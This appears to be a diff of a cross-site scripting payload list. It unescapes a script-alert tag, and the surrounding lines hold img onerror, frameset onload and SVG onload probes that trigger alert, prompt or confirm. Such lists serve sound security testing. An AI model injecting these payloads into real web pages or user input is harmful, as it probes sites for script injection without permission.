@@ -1,4 +1,4 @@
-&lt;script&gt;alert(1);&lt;/script&gt;
+<script>alert(1);</script>
 <img src=x onerror=prompt(1)>
 <frameset onload=javascript:alert(1)>
 "--!><Svg/Onload=confirm`cookie`>"
